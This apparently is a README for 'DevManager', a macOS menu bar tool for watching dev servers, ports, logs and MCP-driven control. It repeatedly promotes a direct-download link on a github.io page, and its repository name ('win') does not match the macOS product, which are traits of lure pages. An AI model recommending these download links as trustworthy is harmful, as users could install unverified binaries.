# DevManager v2026 - macOS dev process manager 2026

> **DevManager is a native macOS menu bar process manager for local development, giving you live server logs, system metrics, port and conflict checks, and MCP-based control in one current release.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/arneschaefer03/dev-manager-win-25303?style=flat-square)](https://github.com/arneschaefer03/dev-manager-win-25303)

---

<p align="center">
  <a href="https://arneschaefer03.github.io/dev-manager-win-25303/">
    <img src="https://img.shields.io/badge/Download-DevManager%20Latest-brightgreen?style=for-the-badge" alt="Download DevManager">
  </a>
</p>

> **[Direct Download - DevManager v2026](https://arneschaefer03.github.io/dev-manager-win-25303/)**

---

[Download Latest Build](https://arneschaefer03.github.io/dev-manager-win-25303/)

---

## About DevManager

DevManager is built for macOS developers who want a single place to watch and control local development processes. Instead of switching between terminals, browser tabs, and monitoring tools, you can keep track of what your dev servers are doing from a lightweight menu bar app designed around quick decisions.

It is especially useful when you are juggling multiple services, testing ports, or coordinating local workflows with automation. With support for Sparkle updates, quick-launch access, and MCP-driven AI control, DevManager fits into daily development without getting in the way of your setup.

---

## Features

- Live colored logs for easy scanning of server output
- CPU and memory metrics for running processes
- Port-ready detection to spot services that are available to use
- Conflict detection for overlapping local development ports
- LAN QR code support for fast device access on the local network
- Quick-launch palette for opening and switching to dev tools quickly
- Start profiles for launching common process groups together
- MCP integration so AI tools can interact with and drive processes
- Sparkle-based auto update support for release delivery

---

## Installation

Clone or download the repository, then open the macOS project in your preferred SwiftUI-capable development setup.

1. Get the code:
   - `git clone https://github.com/arneschaefer03/dev-manager-win-25303.git
2. Open the project in Xcode.
3. Build and run the app on macOS.
4. Launch DevManager and keep it available from the menu bar for day-to-day use.

If you are using a packaged build, download the latest release from the link above and launch the app directly on macOS.

---

## Usage

Once DevManager is running, use the menu bar entry to check active local services, review live logs, and watch resource usage without leaving your desktop workflow.

Common workflows include:
- Starting a saved profile for a group of dev servers
- Checking whether a port is ready before opening a local site
- Reviewing conflicts when a service does not start as expected
- Using the quick-launch palette to jump to a tool or process
- Scanning a LAN QR code to open local services on another device
- Letting an MCP-connected assistant manage supported process actions

For best results, keep your local dev services organized into repeatable profiles and use the app as a central dashboard while you work.

---

## Configuration

DevManager is centered around local app settings and saved process profiles. Configuration details are handled inside the app and across the project files used by the macOS build.

Typical areas you may want to review:
- start profiles for grouped launches
- menu bar behavior and quick-launch preferences
- process and port monitoring options
- update settings for Sparkle delivery
- MCP connection setup for AI-driven control

If you are customizing the project, look through the SwiftUI source and app configuration files that define these behaviors.

---

## Requirements

- macOS
- A local development environment with one or more dev servers to manage
- Xcode for building from source
- SwiftUI support for the application UI
- Network access if you plan to use update checks or LAN sharing features

---

## FAQ

**Can I use DevManager for multiple local projects?**  
Yes. It is designed to help manage several local development processes and organize them through profiles and quick access tools.

**How do updates work?**  
The project includes Sparkle auto update support, so release delivery can be handled through the app's update flow.

**Where are my settings stored?**  
Settings are managed locally by the app and its project configuration. Check the app data and project files when customizing behavior.

**What if a server is not starting?**  
Use the conflict and port checks to see whether another process is already occupying the target port, then review the live logs for the failing service.

**Does it support AI-assisted control?**  
Yes. MCP support is included so compatible AI tools can interact with supported process workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
